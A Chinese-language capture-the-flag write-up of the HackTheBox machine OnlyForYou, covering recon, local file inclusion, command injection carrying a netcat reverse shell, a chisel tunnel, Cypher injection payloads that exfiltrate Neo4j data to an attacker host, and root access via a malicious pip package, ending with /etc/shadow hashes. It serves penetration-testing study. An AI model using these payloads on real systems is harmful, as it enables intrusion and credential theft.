---
title: OnlyForYou - HackTheBox
url: https://darkwing.moe/2023/04/24/OnlyForYou-HackTheBox/
source: 喵喵喵喵
date: 2023-04-25
fetch_date: 2025-10-04T11:31:21.885930
---

# OnlyForYou - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

OnlyForYou - HackTheBox

# OnlyForYou - HackTheBox

##### 2023-04-24

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. beta.only4you.htb](#beta-only4you-htb)
4. [4. beta source](#beta-source)
5. [5. LFI](#LFI)
6. [6. 命令注入 shell](#命令注入-shell)
   1. [6.1. socks proxy](#socks-proxy)
7. [7. info](#info)
   1. [7.1. gogs 3000](#gogs-3000)
   2. [7.2. Neo4j 7474](#Neo4j-7474)
   3. [7.3. 8001](#8001)
8. [8. Cypher Injection](#Cypher-Injection)
9. [9. user flag & Gogs](#user-flag-amp-Gogs)
   1. [9.1. user flag](#user-flag)
10. [10. 提权信息](#提权信息)
11. [11. 提权 & root flag](#提权-amp-root-flag)
    1. [11.1. shadow](#shadow)
12. [12. 参考资料](#参考资料)

# OnlyForYou - HackTheBox

2023-04-24

# 基本信息

* <https://app.hackthebox.com/machines/OnlyForYou>
* 10.10.11.210

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042401.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.210 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 10:24 CST Nmap scan report for 10.10.11.210 Host is up (0.093s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 e883e0a9fd43df38198aaa35438411ec (RSA) |   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA) |_  256 445f7aa377690a77789b04e09f11db80 (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://only4you.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.69 seconds ``` |

## 80

需要加hosts，一个官网：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.210 only4you.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042402.jpg)

# 子域名扫描

子域名发现beta：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://only4you.htb/" -H 'Host: FUZZ.only4you.htb' -fs 178  [Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 299ms]     * FUZZ: beta ``` |

## beta.only4you.htb

同样加hosts后访问,提供一份代码下载：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042403.jpg)

# beta source

根据代码可以知道是flask 应用，download里发现LFI，不能 出现`..`,不能以`../`开头，但可以直接使用绝对路径：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042404.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042405.jpg)

# LFI

一步步读文件:

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` /etc/nginx/sites-available/default /var/www/only4you.htb/app.py /var/www/only4you.htb/form.py ``` |

发现email的domain拼接到执行的命令中，存在一些过滤, 但注意判断方法，只要匹配到符合正则的字符串就可以继续进行后续处理,导致命令注入：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042406.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042407.jpg)

# 命令注入 shell

利用命令注入得到www-data shell：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 1@1.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042408.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042409.jpg)

## socks proxy

简单的枚举发现本地端口一些服务，打通代理：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` wget http://10.10.14.8:7777/chisel_1.7.6_linux_amd64 chmod +x chisel_1.7.6_linux_amd64  # local ./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse  # target ./chisel_1.7.6_linux_amd64 client 10.10.14.8:9999 R:socks ``` |

# info

## gogs 3000

3000端口是gogs：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042414.jpg)

## Neo4j 7474

7474端口是neo4j:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042410.jpg)

## 8001

8001需要登录，简单的admin:admin进去：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042411.jpg)

# Cypher Injection

根据已有信息，8001的服务应该是使用的neo4j，尝试neo4j的Cypher Injection：

* Cypher Injection (neo4j) - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j>

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.8:7777/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042412.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042413.jpg)

后面就是一步步获取信息，得到一些用户名和密码hash：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.8:7777/?label='+label as l RETURN 0 as _0 //  ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.8:7777/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 // ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042415.jpg)

得到的hash破解出密码：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` admin a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 ThisIs4You john 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 admin ``` |

# user flag & Gogs

得到的账号密码组合后可以登录ssh以及gogs：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` john ： ThisIs4You ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042416.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042417.jpg)

## user flag

john用户目录得到user flag：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042418.jpg)

# 提权信息

检查sudo发现是pip从gogs是那里下载：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042419.jpg)

很明显是让我们通过gogs托管一个恶意包，然后pip去执行,虽然字面上是download，但实际上是会去运行代码的:

* Malicious Python Packages and Code Execution via pip download · Embrace The Red
  <https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/>

# 提权 & root flag

修改demo里setup.py中的代码，打包，传到gogs上：

* wunderwuzzi23/this\_is\_fine\_wuzzi: Demo of a malicious python package that will run code upon pip download or install
  <https://github.com/wunderwuzzi23/this_is_fine_wuzzi>

  注意原本的Test repo是私有的，需要设置成公开的才能下载

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042420.jpg)

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` pip3 install build python3 -m build  http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz  sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023042421.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$6$TJLQffVnCXmnRBpq$Shtj6r4nJt672cmV2bhnlK9wb6YlI1tKpJoupUoVM/LFd7vmbLuDX4jtlYW3Lcft2sjWmHk5h58Q8vaFDOtFR.:19326:0:99999:7::: john:$6$BBuIQ1RjM9BXy2zw$5.O1009Bf4oXy/qGS5dp9U514X5GJMbkYBGgcWlmTVCzn3H.E6wF1cVAmjZzf8UCExE0dmfxGylCix6q29icq0:19326:0:99999:7::: ``` |

# 参考资料

* Cypher Injection (neo4j) - HackTricks
  <https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j>
* Malicious Python Packages and Code Execution via pip download · Embrace The Red
  <https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/>
* wunderwuzzi23/this\_is\_fine\_wuzzi: Demo of a malicious python packa...